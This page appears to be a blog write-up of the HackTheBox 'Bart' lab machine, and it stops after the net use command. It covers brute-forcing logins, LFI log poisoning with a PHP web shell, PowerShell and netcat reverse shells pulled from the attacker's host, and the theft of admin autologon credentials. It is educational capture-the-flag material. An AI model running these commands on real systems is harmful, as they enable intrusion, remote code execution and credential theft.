@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Bart | Bart was not a straightforward box but I enjoyed it because there are so many things to learn. Recon is not immediate and need to fiddle a bit...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Bart</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-04-30 17:53:00+01:00">Thu 30 April 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Bart.html">Bart</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Bart.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>Bart was not a straightforward box but I enjoyed it because there are so many things to learn. Recon is not immediate and need to fiddle a bit with directories. Then we have to brute force to get in the website forum page and once there we have an LFI to exploit to get a reverse shell. There are few ways to privesc including <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> although I used <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a> to find admin credentials and use the latter to mount a share on localhost and get the flags. </p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $nmap -sV -sC -p- 10.10.10.81</span>
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 05:55 BST</span>
+<span class="go">Nmap scan report for 10.10.10.81</span>
+<span class="go">Host is up (0.11s latency).</span>
+<span class="go">Not shown: 65534 filtered ports</span>
+<span class="go">PORT   STATE SERVICE VERSION</span>
+<span class="go">80/tcp open  http    Microsoft IIS httpd 10.0</span>
+<span class="go">| http-methods: </span>
+<span class="go">|_  Potentially risky methods: TRACE</span>
+<span class="go">|_http-server-header: Microsoft-IIS/10.0</span>
+<span class="go">|_http-title: Did not follow redirect to http://forum.bart.htb/</span>
+<span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 281.23 seconds</span>
+</pre></div>
+
+
+<p>Nmap finds only port 80 open indicating there is an IIS v10 server running. I browse to <code>http://10.10.10.81</code> and I can see I am re-directed to <code>http://forum.bart.htb/</code> but I get a blank page. When this happens usually I need to add the name in the <code>/etc/hosts/</code> file on my box. Once I did that I was able to view the forum:</p>
+<p><img alt="" src="../images/bart-forum.png"></p>
+<p>I start having a look at the web page while in parallel I run dirbuster to scan for directories an files in the site. After some time dirbuster finds few results:</p>
+<p><img alt="" src="../images/bart-dirbuster.png"></p>
+<p>If I go to the <code>/forum</code> directory from my browser I end up on the same forum I found earlier. The other interesing directory is <code>/monitor</code>.</p>
+<p><img alt="" src="../images/bart-monitor.png"></p>
+<p>As shown above we can see a <a href="https://github.com/phpservermon/phpservermon">PHP Server Monitor</a> portal. I looked for exploits but I did not find anything useful. I abandoned this for a moment but I got back to it and decided to try to find a valid user which we can use to perfom a brute force attack later on. There is a "Forgot password?" option which requires to specify the username and the portal would send an email to that user with a link to reset the password. </p>
+<p>While looking at the forum page I saw different employee names with contact details. Amongst these there is the head of IT:</p>
+<p>Robert Hilton
+r.hilton@bart.htb</p>
+<p>I tried few combinations but got always an error:</p>
+<p><img alt="" src="../images/bart-IThead.png"></p>
+<p>While looking at the forum page html source code I found this piece of code which is commented out:</p>
+<p><img alt="" src="../images/bart-devuser.png"></p>
+<p>This reveals there is another user called "Harvey Potter" and he seems to be the developer which means he may be the one administering the site and the monitor portal. As there are quite few combinations I want to try I decided to use burp intruder to identify the correct user name instead of trying manually. So I created a text file containing these names:</p>
+<div class="highlight"><pre><span></span><span class="go">admin</span>
+<span class="go">administrator</span>
+<span class="go">monitor</span>
+<span class="go">monadmin</span>
+<span class="go">bart</span>
+<span class="go">bartadmin</span>
+<span class="go">siteadmin</span>
+<span class="go">webmaster</span>
+<span class="go">r.hilton@bart.htb</span>
+<span class="go">r.hilton</span>
+<span class="go">robert</span>
+<span class="go">hilton</span>
+<span class="go">h.potter@bart.htb</span>
+<span class="go">h.potter</span>
+<span class="go">Developer@BART</span>
+<span class="go">dev</span>
+<span class="go">devadmin</span>
+<span class="go">potter</span>
+<span class="go">harvey</span>
+<span class="go">harveypotter</span>
+</pre></div>
+
+
+<p>Then I captured the http POST request with burp and sent it to the intruder module:</p>
+<p><img alt="" src="../images/bart-intruder1.png"></p>
+<p>in the "Positions" tab I make sure to make the user_name field a variable with these weird symbols highlighted.</p>
+<p><img alt="" src="../images/bart-intruder2.png"></p>
+<p>then in the "Payloads" tab I load the file containing the potential user names and I click on stack attack. The result is the following:</p>
+<p><img alt="" src="../images/bart-intruder3.png"></p>
+<p>The lenght is the same for all the names except for "harvey". When I try I see this:</p>
+<p><img alt="" src="../images/bart-harvey.png"></p>
+<p>So finally we have a valid username, now we can try to guess some passwords and if we are not lucky launching a brute force attack.</p>
+<p>After very few attempts I managed to login, the password is "potter". Way too easy! </p>
+<p>NOTE: I had to add another entry in the <code>/etc/hosts</code> file for <code>monitor.forum.htb</code>. Once logged in I was able to see one server that the application is monitoring under the "Servers" page:</p>
+<p><img alt="" src="../images/bart-loggedin.png"></p>
+<p>to access that address I had to put another entry in the hosts file:</p>
+<p><img alt="" src="../images/bart-internal.png"></p>
+<p>Once done we are presented with an internal chat login form which requires other credentials. I tried the same process I used earlier to identify the username but I was not successful with that. I then launched <code>dirbuster</code> against that site but found nothing interesting. </p>
+<p>At this point I made an assumption that the username is again "harvey" and I used hydra to make a brute force attack:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[✗]─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $hydra  -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb http-form-post &quot;/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password&quot;</span>
+<span class="go">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span>
+
+<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-09 05:32:34</span>
+<span class="go">[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore</span>
+<span class="go">[DATA] max 16 tasks per 1 server, overall 16 tasks, 4725 login tries (l:1/p:4725), ~296 tries per task</span>
+<span class="go">[DATA] attacking http-post-form://internal-01.bart.htb:80/simple_chat/login.php:uname=^USER^&amp;passwd=^PASS^&amp;submit=Login:Password</span>
+<span class="go">[STATUS] 676.00 tries/min, 676 tries in 00:01h, 4049 to do in 00:06h, 16 active</span>
+<span class="go">[80][http-post-form] host: internal-01.bart.htb   login: harvey   password: Password1</span>
+<span class="go">1 of 1 target successfully completed, 1 valid password found</span>
+<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-09 05:33:59</span>
+</pre></div>
+
+
+<p>the assumption worked and the above output indicates the passwoed for the user "harvey" is "Password1".</p>
+<p><img alt="" src="../images/bart-chat.png"></p>
+<p>Once I log in there is a chat window where I am able to write stuff as shown above. While inspecting the page source I noticed this piece of code:</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;log_link&quot;</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+                    <span class="kd">function</span> <span class="nx">saveChat</span><span class="p">()</span> <span class="p">{</span>
+                        <span class="c1">// create a serialized object and send to log_chat.php. Once done hte XHR request, alert &quot;Done&quot;</span>
+                    <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+                    <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="nx">alert</span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+                    <span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&#39;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+                    <span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+                    <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Done&quot;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;saveChat()&quot;</span><span class="p">&gt;</span>Log<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+            <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</pre></div>
+
+
+<p>The code above is for a function which objective is to save the content of the chat. It indicates that when a user clicks on the <code>Log</code> link, present on the right upper part of the chat page, a GET request to the URL <code>http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey</code> will be made with the 3rd parameter true and the following popup will be shown:</p>
+<p><img alt="" src="../images/bart-chat-Log.png"></p>
+<p>Then a call back to the <code>xhr.onreadystatechange</code> function is made which "alerts" with the response text (<code>alert(xhr.responseText)</code>). </p>
+<p>If we visit the URL <code>http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey</code> we simply get <code>1</code> as result.</p>
+<p>The URL in question shows LFI (Local File Inclusion) characteristics. If an LFI vulnerability is present we would be able to include a local file in the <code>filename</code> parameter in a way that we would be able to read it and potentially manipulate it. If we try the source page itself as the local file to include, that is <code>log.php</code> we get the following:</p>
+<p><img alt="" src="../images/bart-log.png"></p>
+<p>This indeed indicates an LFI (Local File Inclusion) vulnerability, that is we are able to include the file <code>log.php</code> and read the information it generates, in this case the user name (<code>harvey</code>) and the user agent, <code>Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</code>. We can now see if we can get code execution leveraging the LFI by poisoning the file with some code. The <a href="https://sittingducks.io/Poison.html">Poison HTB box write-up</a> I wrote some time ago explains LFI and log poisining in more details if you would like to have a look. </p>
+<p>Let's get this into burp and modify the user agent field with a simple php code, that is <code>&lt;?php system($_GET['cmd']); ?&gt;</code>. </p>
+<p><img alt="" src="../images/bart-rce.png"></p>
+<p>I have also appended <code>&amp;cmd=whoami</code> in the request and as a result I have obtained RCE into the victim box. The result on the right pane shows <code>nt authority\iusr</code> is the user logged in the victim Windows box. </p>
+<p>At this point it will be fairly easy to get a shell and, of course, there are many ways. I take a nishang reverse powershell available in my ParrotOS box at <code>/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1</code> and I edit the content. All I need to do is basically add the following line at the bottom of the shell:</p>
+<div class="highlight"><pre><span></span><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">15</span> <span class="n">-Port</span> <span class="n">443</span>
+</pre></div>
+
+
+<p>Then I host the shell on a python simple http server and a start a netcat listner. I get back to burp, instead of <code>whoami</code> I will now need to call the shell with this command:</p>
+<div class="highlight"><pre><span></span><span class="go">powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.15:8000/shell.ps1&#39;)&quot;</span>
+</pre></div>
+
+
+<p><img alt="" src="../images/bart-burp-shell.png"></p>
+<p>I also had to URL-encode the above string (using CTRL+u). Once I sent the request I see nothing in the burp response panel but I go back to my box I see the shell:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0ff@SittingDucks]─[~]</span>
+<span class="go">└──╼ $sudo nc -lvnp 443</span>
+<span class="go">[sudo] password for m4rc0ff: </span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.15] from (UNKNOWN) [10.10.10.81] 49895</span>
+<span class="go">Windows PowerShell running as user BART$ on BART</span>
+<span class="go">Copyright (C) 2015 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">PS C:\inetpub\wwwroot\internal-01\log&gt;whoami</span>
+<span class="go">nt authority\iusr</span>
+</pre></div>
+
+
+<p>The <code>dir</code> command shows us the <code>log.php</code> used for the LFI and also the <code>log.txt</code>.  </p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\inetpub\wwwroot\internal-01\log&gt;dir</span>
+
+
+<span class="go">    Directory: C:\inetpub\wwwroot\internal-01\log</span>
+
+
+<span class="go">Mode                LastWriteTime         Length Name                          </span>
+<span class="go">----                -------------         ------ ----                          </span>
+<span class="go">d-----       21/02/2018     19:44                Microsoft                     </span>
+<span class="go">-a----       17/05/2020     08:32           1545 log.php                       </span>
+<span class="go">-a----       17/05/2020     07:15           1091 log.txt                       </span>
+<span class="go">-a----       17/05/2020     08:28             99 loh.php </span>
+</pre></div>
+
+
+<p>There is also another file, <code>loh.php</code>. This is a typo I had done during my attempts indicating that the LFI gives also write permissions and we could have included and poisoned our own file:</p>
+<div class="highlight"><pre><span></span><span class="gp">PS C:\inetpub\wwwroot\internal-01\log&gt; </span><span class="nb">type </span><span class="n">loh</span><span class="p">.</span><span class="n">php</span>
+<span class="go">[2020-05-17 10:28:48] - harvey - Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+</pre></div>
+
+
+<p>Moving to the <code>C:\users</code> directory we can see different users:</p>
+<div class="highlight"><pre><span></span><span class="gp">PS C:\users&gt; </span><span class="nb">dir</span>
+
+
+<span class="go">    Directory: C:\users</span>
+
+
+<span class="go">Mode                LastWriteTime         Length Name                          </span>
+<span class="go">----                -------------         ------ ----                          </span>
+<span class="go">d-----       04/02/2018     21:58                Administrator                 </span>
+<span class="go">d-----       02/10/2017     13:08                DefaultAppPool                </span>
+<span class="go">d-----       04/10/2017     08:40                forum.bart.local              </span>
+<span class="go">d-----       21/02/2018     21:39                h.potter                      </span>
+<span class="go">d-----       24/09/2017     21:55                Harvey Potter                 </span>
+<span class="go">d-----       04/02/2018     21:56                internal.bart.local           </span>
+<span class="go">d-----       04/10/2017     08:42                monitor.bart.local            </span>
+<span class="go">d-----       06/02/2018     10:15                privileged                    </span>
+<span class="go">d-r---       21/02/2018     21:45                Public                        </span>
+<span class="go">d-----       02/10/2017     13:08                test       </span>
+</pre></div>
+
+
+<p>I tried to access these folders but I got an access denied error </p>
+<div class="highlight"><pre><span></span><span class="gp">PS C:\users\h.potter&gt; </span><span class="nb">dir </span><span class="err">:</span> <span class="n">Access</span> <span class="n">to</span> <span class="n">the</span> <span class="n">path</span> <span class="s1">&#39;C:\users\h.potter&#39;</span> <span class="n">is</span> <span class="n">denied</span><span class="p">.</span>
+<span class="go">At line:1 char:1</span>
+<span class="go">+ dir</span>
+<span class="go">+ ~~~</span>
+<span class="go">    + CategoryInfo          : PermissionDenied: (C:\users\h.potter:String) [Ge </span>
+<span class="go">   t-ChildItem], UnauthorizedAccessException</span>
+<span class="go">    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. </span>
+<span class="go">   Commands.GetChildItemCommand</span>
+</pre></div>
+
+
+<p>so we need to find a way to privesc even to get the <code>user.txt</code>.</p>
+<p>Now I was able to run <a href="https://github.com/sherlock-project/sherlock">Sherlock</a>. I had to modify the script and add <code>Find-AllVulns</code> at the end of the file to invoke the  <code>Find-AllVulns</code> function.</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\inetpub\wwwroot\internal-01\log&gt;powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.15:8000/Sherlock.ps1&#39;)&quot;</span>
+<span class="go">powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.15:8000/Sherlock.ps1&#39;)&quot;</span>
+
+
+<span class="go">Title      : User Mode to Ring (KiTrap0D)</span>
+<span class="go">MSBulletin : MS10-015</span>
+<span class="go">CVEID      : 2010-0232</span>
+<span class="go">Link       : https://www.exploit-db.com/exploits/11199/</span>
+<span class="go">VulnStatus : Not supported on 64-bit systems</span>
+
+<span class="go">Title      : Task Scheduler .XML</span>
+<span class="go">MSBulletin : MS10-092</span>
+<span class="go">CVEID      : 2010-3338, 2010-3888</span>
+<span class="go">Link       : https://www.exploit-db.com/exploits/19930/</span>
+<span class="go">VulnStatus : Not Vulnerable</span>
+
+<span class="go">Title      : NTUserMessageCall Win32k Kernel Pool Overflow</span>
+<span class="go">MSBulletin : MS13-053</span>
+<span class="go">CVEID      : 2013-1300</span>
+<span class="go">Link       : https://www.exploit-db.com/exploits/33213/</span>
+<span class="go">VulnStatus : Not supported on 64-bit systems</span>
+
+<span class="go">Title      : TrackPopupMenuEx Win32k NULL Page</span>
+<span class="go">MSBulletin : MS13-081</span>
+<span class="go">CVEID      : 2013-3881</span>
+<span class="go">Link       : https://www.exploit-db.com/exploits/31576/</span>
+<span class="go">VulnStatus : Not supported on 64-bit systems</span>
+
+<span class="go">Title      : TrackPopupMenu Win32k Null Pointer Dereference</span>
+<span class="go">MSBulletin : MS14-058</span>
+<span class="go">CVEID      : 2014-4113</span>
+<span class="go">Link       : https://www.exploit-db.com/exploits/35101/</span>
+<span class="go">VulnStatus : Not Vulnerable</span>
+
+<span class="go">Title      : ClientCopyImage Win32k</span>
+<span class="go">MSBulletin : MS15-051</span>
+<span class="go">CVEID      : 2015-1701, 2015-2433</span>
+<span class="go">Link       : https://www.exploit-db.com/exploits/37367/</span>
+<span class="go">VulnStatus : Not Vulnerable</span>
+
+<span class="go">Title      : Font Driver Buffer Overflow</span>
+<span class="go">MSBulletin : MS15-078</span>
+<span class="go">CVEID      : 2015-2426, 2015-2433</span>
+<span class="go">Link       : https://www.exploit-db.com/exploits/38222/</span>
+<span class="go">VulnStatus : Not Vulnerable</span>
+
+<span class="go">Title      : &#39;mrxdav.sys&#39; WebDAV</span>
+<span class="go">MSBulletin : MS16-016</span>
+<span class="go">CVEID      : 2016-0051</span>
+<span class="go">Link       : https://www.exploit-db.com/exploits/40085/</span>
+<span class="go">VulnStatus : Not supported on 64-bit systems</span>
+
+<span class="go">Title      : Secondary Logon Handle</span>
+<span class="go">MSBulletin : MS16-032</span>
+<span class="go">CVEID      : 2016-0099</span>
+<span class="go">Link       : https://www.exploit-db.com/exploits/39719/</span>
+<span class="go">VulnStatus : Not Supported on single-core systems</span>
+
+<span class="go">Title      : Windows Kernel-Mode Drivers EoP</span>
+<span class="go">MSBulletin : MS16-034</span>
+<span class="go">CVEID      : 2016-0093/94/95/96</span>
+<span class="go">Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1</span>
+<span class="go">             6-034?</span>
+<span class="go">VulnStatus : Not Vulnerable</span>
+
+<span class="go">Title      : Win32k Elevation of Privilege</span>
+<span class="go">MSBulletin : MS16-135</span>
+<span class="go">CVEID      : 2016-7255</span>
+<span class="go">Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S</span>
+<span class="go">             ample-Exploits/MS16-135</span>
+<span class="go">VulnStatus : Not Vulnerable</span>
+
+<span class="go">Title      : Nessus Agent 6.6.2 - 6.10.3</span>
+<span class="go">MSBulletin : N/A</span>
+<span class="go">CVEID      : 2017-7199</span>
+<span class="go">Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h</span>
+<span class="go">             tml</span>
+<span class="go">VulnStatus : Not Vulnerable</span>
+</pre></div>
+
+
+<p>Sherlock didn't bring home good results as shown above so I tried to run another recon script, <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a> which is part of the PowerSploit suite. As per Sherlock I add <code>Get-RegistryAutoLogon</code> at the end of the script to see if there is that registry key which can help us to privesc. When running the script I did not get any results:</p>
+<div class="highlight"><pre><span></span><span class="gp">PS C:\&gt; </span><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.15:8000/PowerUp.ps1&#39;</span><span class="p">)</span><span class="s2">&quot;</span>
+<span class="go">PS C:\&gt;</span>
+</pre></div>
+
+
+<p>I think this may be related to my shell being 32-bit whereas the PowerUp script runs the registry function on the 64-bit system. We can check that easily with:</p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\inetpub\wwwroot\internal-01\log&gt;[Environment]::Is64BitProcess</span>
+<span class="go">False</span>
+</pre></div>
+
+
+<p>so I decided to get a better shell by downloading a 64 bit version of netcat in the victim box with <code>certutil</code> and create another connection to my box.</p>
+<div class="highlight"><pre><span></span><span class="gp">PS C:\users\public&gt; </span><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">15</span><span class="err">:</span><span class="n">8000</span><span class="p">/</span><span class="n">nc64</span><span class="p">.</span><span class="n">exe</span> <span class="n">nc</span><span class="p">.</span><span class="n">exe</span>
+<span class="go">****  Online  ****</span>
+<span class="go">  0000  ...</span>
+<span class="go">  b0d8</span>
+<span class="go">CertUtil: -URLCache command completed successfully.</span>
+<span class="gp">PS C:\users\public&gt; </span><span class="nb">dir</span>
+
+
+<span class="go">    Directory: C:\users\public</span>
+
+
+<span class="go">Mode                LastWriteTime         Length Name                          </span>
+<span class="go">----                -------------         ------ ----                          </span>
+<span class="go">d-r---       24/09/2017     19:35                Documents                     </span>
+<span class="go">d-r---       18/03/2017     21:03                Downloads                     </span>
+<span class="go">d-r---       18/03/2017     21:03                Music                         </span>
+<span class="go">d-r---       18/03/2017     21:03                Pictures                      </span>
+<span class="go">d-r---       18/03/2017     21:03                Videos                        </span>
+<span class="go">-a----       17/05/2020     08:42          45272 nc.exe                        </span>
+
+
+<span class="gp">PS C:\users\public&gt; </span><span class="p">./</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-e</span> <span class="n">powershell</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">15</span> <span class="n">444</span>
+</pre></div>
+
+
+<p>I get the shell and if I run the command again I get "True":</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0ff@SittingDucks]─[~]</span>
+<span class="go">└──╼ $sudo nc -lvnp 444</span>
+<span class="go">listening on [any] 444 ...</span>
+<span class="go">connect to [10.10.14.15] from (UNKNOWN) [10.10.10.81] 53721</span>
+<span class="go">Windows PowerShell </span>
+<span class="go">Copyright (C) 2016 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">PS C:\users\public&gt; [Environment]::Is64BitProcess</span>
+<span class="go">[Environment]::Is64BitProcess</span>
+<span class="go">True</span>
+<span class="go">PS C:\users\public&gt; </span>
+</pre></div>
+
+
+<p>Alternatively we could have invoked PowerUp from <code>C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe</code> since this is a 64-bit process but I prefer to get a shell.</p>
+<p>Now I run PowerUp again:</p>
+<div class="highlight"><pre><span></span><span class="gp">PS C:\users\public&gt; </span><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">downloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.15:8000/PowerUp.ps1&#39;</span><span class="p">)</span>
+<span class="go">IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.15:8000/PowerUp.ps1&#39;)</span>
+
+
+<span class="go">DefaultDomainName    : DESKTOP-7I3S68E</span>
+<span class="go">DefaultUserName      : Administrator</span>
+<span class="go">DefaultPassword      : 3130438f31186fbaf962f407711faddb</span>
+<span class="go">AltDefaultDomainName : </span>
+<span class="go">AltDefaultUserName   : </span>
+<span class="go">AltDefaultPassword   :</span>
+</pre></div>
+
+
+<p>This time the script worked. Now we have the Administrative credentials and need to find a way to get the flags. There are various ways to achieve that but probably a simple one is to use <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)">net use</a> to connect to a share on the victim box using the administrator credentials. Although this method does not give us a full administraor shell, it should be enough to read the flags. </p>
+<div class="highlight"><pre><span></span><span class="go">PS C:\&gt; net use z: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb</span>
+<span class="go">The command completed successfully.</span>
+
